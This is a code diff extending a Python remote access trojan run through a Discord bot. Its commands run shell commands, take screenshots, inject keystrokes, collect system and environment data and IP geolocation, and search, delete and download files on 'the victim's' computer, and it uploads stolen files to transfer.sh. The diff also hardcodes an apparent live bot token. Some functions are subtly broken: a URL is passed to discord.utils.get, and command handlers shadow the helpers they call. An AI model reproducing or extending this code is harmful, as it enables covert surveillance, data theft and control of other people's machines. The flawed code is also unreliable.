@@ -1,3 +1,4 @@
+import json
 import os
 import os.path
 import time
@@ -12,15 +13,15 @@ import requests
 from discord import *
 from discord.utils import get
 
-global Ping_On_Startup
-global Token
-global GuildId
-GuildId = "Guild Id here"
+global ping_on_startup
+global token
+global guild_iD
+guild_iD = "984582818489331732"
 # guild id here
-Token = ""
+token = "MTAwODQ5Nzk3MzkwNDI4MTc0Mg.GfT0TI.8CRWntdiDOn4lTQlUSFtLJywQJQfbvPsnJhrZE"
 # Bot Token Here Obviously
 # Bot needs all intents
-Ping_On_Startup = True
+ping_on_startup = True
 # if the bot should ping you when an infected user starts his Computer
 
 
@@ -36,8 +37,8 @@ class Control(discord.Client):
 		self.tree = app_commands.CommandTree(self)
 
 	async def setup_hook(self):
-		self.tree.copy_global_to(guild=discord.Object(id=GuildId))
-		await self.tree.sync(guild=discord.Object(id=GuildId))
+		self.tree.copy_global_to(guild=discord.Object(id=int(guild_iD)))
+		await self.tree.sync(guild=discord.Object(id=int(guild_iD)))
 
 
 bot = Control()
@@ -46,11 +47,14 @@ bot = Control()
 @bot.event
 async def on_ready():
 	# print(f"logged in as [{bot.user}]")
-	username = os.getenv("USERNAME")
+	username = os.getenv("username")
 	for guild in bot.guilds:
 		channel = get(guild.text_channels, name="d")
-		if Ping_On_Startup:
-			await channel.send(f"@everyone `{username}` started `{__file__}` <:control:1029794910695596074>")
+		if ping_on_startup:
+			try:
+				await channel.send(f"@everyone `{username}` started `{__file__}`")
+			except Exception as e:
+				pass
 
 
 def download(url: str, directory: str, filename: str):
@@ -62,27 +66,27 @@ def download(url: str, directory: str, filename: str):
 	return output
 
 
-def delete(Filelocation: str):
-	Filelocation = Filelocation.casefold().replace("%user%", os.getenv("USERNAME"))
-	Filelocation = Filelocation.casefold().replace("%username%", os.getenv("USERNAME"))
-	if exists(Filelocation):
-		os.remove(Filelocation)
-		output = f"File `{Filelocation}` deleted"
+def delete(filelocation: str):
+	filelocation = filelocation.casefold().replace("%user%", os.getenv("username"))
+	filelocation = filelocation.casefold().replace("%username%", os.getenv("username"))
+	if exists(filelocation):
+		os.remove(filelocation)
+		output = f"File `{filelocation}` deleted"
 	else:
-		output = f"File `{Filelocation}` not found"
+		output = f"File `{filelocation}` not found"
 	return output
 
 
-def transfer(Filelocation: str):
-	Filelocation = Filelocation.casefold().replace("%user%", os.getenv("USERNAME"))
-	Filelocation = Filelocation.casefold().replace("%username%", os.getenv("USERNAME"))
+def transfer(filelocation: str):
+	filelocation = filelocation.casefold().replace("%user%", os.getenv("username"))
+	filelocation = filelocation.casefold().replace("%username%", os.getenv("username"))
 
-	if exists(Filelocation):
-		fileToUpload = {"file": (Filelocation, open(Filelocation, mode='rb'))}
+	if exists(filelocation):
+		fileToUpload = {"file": (filelocation, open(filelocation, mode='rb'))}
 		r = requests.post("https://transfer.sh/", files=fileToUpload)
 		output = r.text
 	else:
-		output = f"File {Filelocation} not found"
+		output = f"File {filelocation} not found"
 	return output
 
 
@@ -99,12 +103,56 @@ def ListDir(directory):
 	if exists(dirToList):
 		ListedDir = os.listdir(dirToList)
 		for i in ListedDir:
-			# s += i + "\n"
 			s += f" -> `{i}`\n"
 	else:
 		s = f"Directory `{dirToList}` not found"
-
 	return s
+
+
+def victimtype(toPress: str):
+	wrote = []
+	args = toPress.casefold().split("enter")
+	for i in args:
+		pyautogui.typewrite(i)
+		wrote.append(i)
+		time.sleep(0.2)
+		pyautogui.press('enter')
+		time.sleep(0.2)
+	return f"Wrote `{wrote}`"
+
+
+def tasklist():
+	t = os.popen("tasklist").read()
+	with open(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\tasklist.txt", "w") as f:
+		f.write(t)
+	f.close()
+	return f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\tasklist.txt"
+
+
+def systemInfo():
+	output = ""
+	ip = get('https://api.ipify.org')
+	envsToGet = ["LANG", "COMPUTERNAME", "COMMONPROGRAMFILES", "LOCALAPPDATA", "OS", "PROCESSOR_ARCHITECTURE",
+	             "SYSTEMROOT", "TEMP", "USERDOMAIN", "USERNAME", "USERPROFILE"]
+	for i in envsToGet:
+		output += f"{i} = {os.getenv(i)}\n"
+	import platform
+	info = platform.uname()
+	info_total = f"""
+        System: {info.system}
+	Release: {info.release}
+	Machine: {info.machine}
+	Processor: {info.processor}
+	Ip: {ip}
+	"""
+	with open(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\systeminfo.txt", "w") as f:
+		f.write(info_total)
+	f.close()
+	with open(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\environmentalVariables.txt", "w") as f:
+		f.write(output)
+	f.close()
+
+	return f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\systeminfo.txt", f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\environmentalVariables.txt"
 
 
 def searchFile(directory: str, keyword: str):
@@ -120,14 +168,21 @@ def searchFile(directory: str, keyword: str):
 		if found_files:
 			output = f"Found Files in `{directory}`:\n"
 			for file in found_files:
-				output += f" -> {file}\n"
+				output += f" -> `{file}`\n"
 		else:
 			output = f"File not found"
 		return output
-
 	else:
 		output = f"Directory `{directory}` not found"
 	return output.format()
+
+
+def geolocate():
+	with urllib.request.urlopen("https://geolocation-db.com/json") as url:
+		data = json.loads(url.read().decode())
+		link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
+		link = f" successfully got Google Maps Coordinates: {link}"
+		return link
 
 
 @bot.tree.command(name="cmd", description="execute command in cmd")
@@ -145,11 +200,40 @@ async def cmd(interaction: discord.Interaction, command: str):
 
 
 @bot.tree.command(name="listdir", description="list all files in a specific directory (use %user% instead of username)")
-async def cmd(interaction: discord.Interaction, directory: str):
+async def listdir(interaction: discord.Interaction, directory: str):
 	directory = directory.casefold().replace("%user%", os.getenv("USERNAME"))
 	directory = directory.casefold().replace("%USERNAME%", os.getenv("USERNAME"))
 	await interaction.response.send_message(f"displaying `{directory}`...")
 	await interaction.channel.send(f"{ListDir(directory)}")
+
+
+@bot.tree.command(name="write", description="make your victim write something")
+async def typing(interaction: discord.Interaction, message: str):
+	await interaction.response.send_message(f"typing `{message}`...")
+	await interaction.channel.send(victimtype(message))
+
+
+@bot.tree.command(name="tasklist",
+                  description="list all running processes")
+async def tasklist(interaction: discord.Interaction):
+	await interaction.response.send_message(f"listing all tasks...")
+	await interaction.channel.send(file=discord.File(tasklist()))
+
+
+@bot.tree.command(name="geolocate",
+                  description="get the geolocation of the of the machine with google maps (not very precise)")
+async def geo(interaction: discord.Interaction):
+	await interaction.response.send_message(f"getting geolocation by ip...")
+	await interaction.channel.send(geolocate())
+
+
+@bot.tree.command(name="systeminfo",
+                  description="attemt to get system info")
+async def sysinfo(interaction: discord.Interaction):
+	await interaction.response.send_message(f"getting system info...")
+	systempath, envpath = systemInfo()
+	await interaction.channel.send(file=discord.File(systempath))
+	await interaction.channel.send(file=discord.File(envpath))
 
 
 @bot.tree.command(name="screenshot", description="get a screenshot of the victim")
@@ -163,29 +247,29 @@ async def scr(interaction: discord.Interaction):
 
 @bot.tree.command(name="upload",
                   description="upwnload a file of the victim to transfer.sh (use %user% instead of username)")
-async def scr(interaction: discord.Interaction, location: str):
+async def upload(interaction: discord.Interaction, location: str):
 	await interaction.response.send_message(f"searching for `{location}`...")
 	await interaction.channel.send(transfer(location))
 
 
 @bot.tree.command(name="search",
                   description="search for a file on the victim's pc pc (use %user% instead of username)")
-async def scr(interaction: discord.Interaction, location: str, keyword: str):
+async def search(interaction: discord.Interaction, location: str, keyword: str):
 	await interaction.response.send_message(f"searching for keyword `{keyword}` in `{location}`...")
 	await interaction.channel.send(searchFile(location, keyword))
 
 
 @bot.tree.command(name="delete", description="delete a file of the victim (use %user% instead of username)")
-async def scr(interaction: discord.Interaction, locinput: str):
+async def delete(interaction: discord.Interaction, locinput: str):
 	await interaction.response.send_message(f"searching for `{locinput}`...")
 	await interaction.channel.send(delete(locinput))
 
 
 @bot.tree.command(name="download",
                   description="download a file on the machine of the victim (needs to be raw [eg. github raw))")
-async def scr(interaction: discord.Interaction, targeturl: str, directory: str, filename: str):
+async def download(interaction: discord.Interaction, targeturl: str, directory: str, filename: str):
 	await interaction.response.send_message(f"searching for `{targeturl}`...")
 	await interaction.channel.send(download(targeturl, directory, filename))
 
 
-bot.run(token=Token)
+bot.run(token=token)
